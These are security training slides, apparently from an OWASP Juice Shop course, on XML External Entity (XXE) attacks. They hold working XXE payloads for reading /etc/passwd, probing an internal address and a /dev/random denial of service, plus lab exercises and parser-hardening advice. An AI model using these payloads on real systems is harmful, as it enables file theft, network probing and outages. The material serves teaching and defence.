# XML Entities

* In the DTD you specify shortcuts as `ENTITY`...
  * `<!ENTITY author "Bjoern Kimminich">`
  * `<!ENTITY copyright "(C) 2018">`

* ...to later dereference them in the XML
  * `<author>&author; &copyright;</author>`

---

# External Entities

* DTD changed to use External Entities...
  * `<!ENTITY author SYSTEM "http://owasp-juice.shop/entities.dtd">`
  * `<!ENTITY copyright	SYSTEM http://owasp-juice.shop/entities.dtd">`

* ...whereas the XML stays the same
  * `<author>&author; &copyright;</author>`

---

# [Attack Vector XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)

* Many older or poorly configured XML processors evaluate external entity references within XML documents

* External entities can be abused for
  * disclosure of internal files
  * internal port scanning
  * remote code execution
  * denial of service attacks

# XML with Attack Payloads

## Extracting Data

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>
```

---

## Network Probing

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
    <foo>&xxe;</foo>
```

## DoS Attack (against Linux-based Systems)

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///dev/random" >]>
    <foo>&xxe;</foo>
```

# Exercise 5.1

1. Identify the weak point of the application that accepts arbitrary XML data as input (:star::star:)
2. Retrieve the content of your local system‘s `C:\Windows\system.ini` (or `/etc/passwd` if you are using Linux) via an XEE attack (:star::star::star:)

---

# [Prevention](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)

* **Configure XML parser to**
  * **disable DTDs completely** (by disallowing `DOCTYPE` declarations) :100:
  * disable External Entities (only if allowing DTDs cannot be avoided)

:x: Selective validation or escaping of tainted data is **not** sufficient, as the whole XML document is crafted by the attacker!

# [XML Parser Hardening Examples](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)

#### `libxml2` (C/C++)

* `XML_PARSE_NOENT` and `XML_PARSE_DTDLOAD` must **not be defined** in the Enum `xmlParserOption`.

_:information_source: Starting with release `2.9` entity expansion is disabled by default. Using any older version makes it more likely to have XXE problems if the configuration was not explicitly hardened._

#### `org.dom4j.io.SAXReader` (Java)

```java
saxReader.setFeature(
  "http://apache.org/xml/features/disallow-doctype-decl", true);
saxReader.setFeature(
  "http://xml.org/sax/features/external-general-entities", false);
saxReader.setFeature(
  "http://xml.org/sax/features/external-parameter-entities", false);
```

#### `java.beans.XMLDecoder` (Java)

* The `readObject()` method in this class is fundamentally unsafe
* It is vulnerable against XXE as well as arbitrary code execution
* There is no way to make use of this class safe

_:warning: Most Java XML parsers have insecure parser settings by default!_

---

# Exercise 5.2

1. Perform a Denial of Service Attack using XXE (:star::star::star::star::star:)

_:information_source: Keeping the server busy with XML parsing for 2 seconds qualifies as DoS for this exercise. The Juice Shop will cancel any successful DoS-like attacks after 2 seconds automatically._
